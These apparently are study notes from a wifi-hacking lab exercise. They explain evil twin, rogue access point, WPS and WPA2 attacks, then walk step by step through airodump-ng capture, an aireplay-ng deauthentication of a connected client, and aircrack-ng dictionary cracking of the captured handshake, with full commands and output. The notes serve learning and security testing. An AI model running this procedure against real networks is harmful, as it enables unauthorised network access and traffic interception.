List of wifi attacks and explanations.
Some lingo and acronyms:

- *AP* - access point
- *PSK* - pre shared key
- *deauth* - de-authentication (packet in this context)
- *BSSID* - Basic Service Set Identifier

- ***Evil twin attack*** - 
		attacker creates an access point that is very similar to the trusted access point. It cannot be exact same because it can be difficult to differentiate.
		The attack starts with de-authentication packets, so in a way it's a DOS for that access point.
		Users won't be able to connect to that *ap*, thus in frustration trying to troubleshoot the problem they connect to *our access point*, allowing us to see all the internet traffic.
- **Rouge access point** -
		Is similar to the evil twin attack but main difference is there is no forced disconnecting via deauth packets.
		Rather that rouge ap is waiting for someone to accidentally connect to it for the same goal of seeing internet traffic.
- **WPS attack** -
		Wifi protected setup (WPS) to allow connecting to the ap without knowing complex passwords, instead it uses *8-digit pin*.
		However this is vulnerable in some networks due to its insecure configuration.
		The attack works by attempting to initiate a WPS *handshake* with the router and capturing the response.
		The response contains some data related to the pin and is vulnerable to brute-force attacks.
		Some of the captured data is brute-forced and the pin is successfully extracted along with the *PSK*.
- **WPA/WPA2 cracking** -
		Wifi protected access (WPA) was created to secure wireless communication, it uses a strong encryption algorithm.
		However the security of it is influenced by the length and complexity of the *PSK*.
		Once the user disconnects, they try to reconnect to the network, and a *4-way handshake* takes place.
		While that is happening the attacker turns its adaptor into monitor mode and captures the handshake.
		After the handshake is captured, the attacker can crack the password by using *brute-force or dictionary attacks* on captured handshake.


### The 4-way Handshake

As mentioned the 4-way handshake involves capturing that packet when a client is connecting to the network.
To be specific the client does *not* have to enter the password for us to be able to attack, rather upon just reconnecting without entering the password.

Again *deauth* attack will be useful in this scenario to kick off the users and listen in for the handshake.

The idea of wpa 4-way hadnshake is to help you as a client and router to confirm you both have the right password or PSK before connecting.

Here is how it happens:
- **Router sends a challenge**:
		The router / ap sends a challenge to the client, asking it to prove it knows the password without directly sharing it.
- **Client responds with encrypted information**:
		The client takes the challenge and uses PSK to create an encrypted response that only the router can verify if it also has the correct PSK.
- **Router verifies and sends confirmation**:
		If the router receives the clients response that matches to what it expects, it knows the client has the right *PSK*.
		The router then send its own confirmation back to the client.
- **Final check and connection established**:
		The client verifies the router's response, and if everything matches, they finish setting up the secure connection.

This handshake does not directly reveal the *PSK* itself but involves encrypted exchanges that depend on the psk.

### The Vulnerability

Lies in the fact that an attacker can capture this 4-way handshake if they are listening when a device connects.
Using that handshake they can perform brute-force attacks to see if it would produce the captured handshake data, eventually cracking the *PSK* if they get a match.

### The Practical

We are going to learn about some CLI tools to help us do the attack.

`iw dev` - show wireless devices and their configurations.

```shell
glitch@wifi:~$ iw dev
phy#2
	Interface wlan2
		ifindex 5
		wdev 0x200000001
		addr 02:00:00:00:02:00
		type managed
		txpower 20.00 dBm                                                                             
```

The device/interface *wlan2* is available, and there are two details to take away from this output:
	1. The `addr` is the **MAC/BSSID** of our device (BSSID - Basic Service Set Identifier).
	2. The `type` is shown as **managed**. This is the standard mode of wi-fi devices.
		In this mode device is a client, connecting to an ap to join a network.
		There is another mode **monitor**, which we will discuss shortly.


To scan for nearby wifi networks using the *wlan2* device.
`sudo iw dev wlan2 scan`
We specified what device to use and what action to perform (wlan2 - scan).

Don't be put of by the verbose output of this command, we  will work thru it.

```shell
glitch@wifi:~$ sudo iw dev wlan2 scan
BSS 02:00:00:00:00:00(on wlan2)
	last seen: 520.388s [boottime]
	TSF: 1730575383370084 usec (20029d, 19:23:03)
	freq: 2437
	beacon interval: 100 TUs
	capability: ESS Privacy ShortSlotTime (0x0411)
	signal: -30.00 dBm
	last seen: 0 ms ago
	Information elements from Probe Response frame:
	SSID: MalwareM_AP
	Supported rates: 1.0* 2.0* 5.5* 11.0* 6.0 9.0 12.0 18.0 
	DS Parameter set: channel 6
	ERP: Barker_Preamble_Mode
	Extended supported rates: 24.0 36.0 48.0 54.0 
	RSN:	 * Version: 1
		 * Group cipher: CCMP
		 * Pairwise ciphers: CCMP
		 * Authentication suites: PSK
		 * Capabilities: 1-PTKSA-RC 1-GTKSA-RC (0x0000)
	Supported operating classes:
		 * current operating class: 81
	Extended capabilities:
		 * Extended Channel Switching
		 * Operating Mode Notification                                                                               
```

There is lot's of info in the output.
But here are the important details indicating that this device is an ap.

- The **BSSID** and **SSID** of the device are `02:00:00:00:00:00` and `MalwareM_AP`.
	- Because **SSID** is show, we can assume the device is advertising a network name.
- Presence of **RSN (Robust Security Network)**.
	- Indicates use of *wpa2* as **RSN** is part of the *wpa2* standard.
	- Used to define the encryption and auth settings.
- The `Group and Pairwise ciphers` are **CCMP** - counter mode with cipher block chaining message auth code protocol.
	- is the encryption method used by wpa2.
- The `Authentication suites` value inside RSN is *PSK* indicating that this is a WPA2 network, where shared password is used for auth.
- The `DS Parameter set` value, which shows channel 6.
	- Refers to a specific frequency range within the broader wifi spectrum.
	- There are various wifi channels, common ones are 2.4 GHz and 5 GHz, channels 1, 6 and 11 are common because they don't overlap.
	- In the 5 GHz band there are many more channels available, allowing for more networks to exits.

#### Monitor mode

This mode is used for network analysis and security auditing.

In this mode wifi interface listens to all wireless traffic on a specific channel, regardless if it's directed to the device or not.
It passively captures all network traffic within range without joining a network.

To check if our `wlan2` interface can use monitor mode.

`sudo ip link set dev wlan2 down` -> turn the device off
`sudo iw dev wlan2 set type monitor` -> switch to monitor mode
`sudo ip link set dev wlan2 up` -> turn the device on

`sudo iw dev wlan2 info` to confirm it is in monitor mode
```shell
glitch@wifi:~$ sudo iw dev wlan2 info
Interface wlan2
	ifindex 5
	wdev 0x200000001
	addr 02:00:00:00:02:00
	type monitor
	wiphy 2
	channel 1 (2412 MHz), width: 20 MHz (no HT), center1: 2412 MHz
	txpower 20.00 dBm
```

Now let's start capturing traffic.
`sudo airodump-ng wlan2` (by default this command will switch interface to monitor mode if its supported).
This will show a list of nearby networks and some details about them, this info we already know from previous commands.

```shell
glitch@wifi:~$ sudo airodump-ng wlan2
BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 02:00:00:00:00:00  -28        2        0    0   6   54   WPA2 CCMP   PSK  MalwareM_AP                             
```

The target is on channel 6 based on this output.
To capture the handshake we will do the following.

First `^c` to cancel airodump-ng.
`sudo airodump-ng -c 6 --bssid 02:00:00:00:00:00 -w output-file wlan2`
We specified channel and mac address of the ap.
This captured data will be saved to files that start as 'wlan2'.
With this setup we are hopefully going to capture the *4-way handshake*.

In this scenario a client is already connected.
The output will change once we receive the info about the connected client.
If a client is indeed connected we can perform a *deauth attack*.
It is important to *keep this command running* until we are done with the attack.

```shell
glitch@wifi:~$ sudo airodump-ng -c 6 --bssid 02:00:00:00:00:00 -w output-file wlan2
BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 02:00:00:00:00:00  -28 100      631        8    0   6   54   WPA2 CCMP   PSK  MalwareM_AP  

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
```

It should take between **1 to 5 minutes** before receiving the client information. In our case, it will show like this:

```shell
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 02:00:00:00:00:00  -28 100      631        8    0   6   54   WPA2 CCMP   PSK  MalwareM_AP  

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 02:00:00:00:00:00  02:00:00:00:01:00  -29    1 - 5      0      140
```

Note that the `STATION` section shows the device's BSSID (MAC) of `02:00:00:00:01:00` that is connected to the access point. This is the connection that we will be attacking. Now we are ready for the next step.

On the second terminal, we will perform deauth attack.

1. **Deauthentication packets**:
	- **aireplay-ng** sends deauth packets to a client or all clients connected to an ap (broadcast attack).
2. **Forcing a reconnection**: 
	- When disconnected client will automatically try to reconnect to the network, this is when the 4-way handshake happens.
3. **Capturing the handshake**:
	- **airodump-ng** comes into play, it will capture the handshake, providing the data to attempt wpa/wpa2 cracking.

We can do this with:

`sudo aireplay-ng -0 1 -a 02:00:00:00:00:00 -c 02:00:00:00:01:00 wlan2`

`-0` flag is for deauth attack
`1` is num of deauths to send
`-a` is BSSID of the ap
`-c` is client of BSSID to deauth

```shell
glitch@wifi:~$ sudo aireplay-ng -0 1 -a 02:00:00:00:00:00 -c 02:00:00:00:01:00 wlan2
19:29:37  Waiting for beacon frame (BSSID: 02:00:00:00:00:00) on channel 6
19:29:38  Sending 64 directed DeAuth (code 7). STMAC: [02:00:00:00:01:00] [ 0| 0 ACKs]
```

Now back in our first terminal, we will see the WPA handshake on the top-right of our output.
`WPA handshake: 02:00:00:00:00:00`

```shell
 CH  6 ][ Elapsed: 1 min ][ 2024-11-02 19:30 ][ WPA handshake: 02:00:00:00:00:00 

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 02:00:00:00:00:00  -28 100      631        8    0   6   54   WPA2 CCMP   PSK  MalwareM_AP  

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 02:00:00:00:00:00  02:00:00:00:01:00  -29    1 - 5      0      140  EAPOL
```

In the second terminal we can use that captured handshake  to attempt to crack it.

`sudo aircrack-ng -a 2 -b 02:00:00:00:00:00 -w /home/glitch/rockyou.txt output*cap`

`-a 2` indicates the wpa/wpa2 attack mode
`-b` bssid of ap
`-w` wordlist path

And lastly the files containing the handshake.

```shell
glitch@wifi:~$ sudo aircrack-ng -a 2 -b 02:00:00:00:00:00 -w /home/glitch/rockyou.txt output*cap
Reading packets, please wait...
Opening output-file-01.cap
Read 276 packets.
1 potential targets

                               Aircrack-ng 1.6 

      [00:00:01] 304/513 keys tested (217.04 k/s) 

      Time left: 0 seconds                                      59.26%

                 KEY FOUND! [ REDACTED ]


      Master Key     : B6 53 9A 71 8C C4 74 5F E3 26 49 82 37 74 65 09 
                       BE C5 62 CE 43 C4 68 A7 B4 8F 8C E6 98 EE 1C CB 

      Transient Key  : 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 

      EAPOL HMAC     : C8 8E D5 F4 B4 5A 1D C4 6C 41 35 07 68 81 79 CD
```

**Note:** If you get an `Packets contained no EAPOL data; unable to process this AP` error, this means that you ran aircrack-ng prior to the handshake being captured or that the handshake was not captured at all. If that's the case, then re-do all of the steps in order to capture the `WPA handshake`.

Now `^c` for the airodump-ng so we can use the network interface again.

```shell
glitch@wifi:~$ wpa_passphrase MalwareM_AP 'ENTER PSK HERE' > config
glitch@wifi:~$ sudo wpa_supplicant -B -c config -i wlan2
```

**Note:** If you get a `rfkill: Cannot get wiphy information` error, you can ignore it. You will also notice that `wpa_supplicant` has automatically switched our **wlan2** interface to **managed mode**.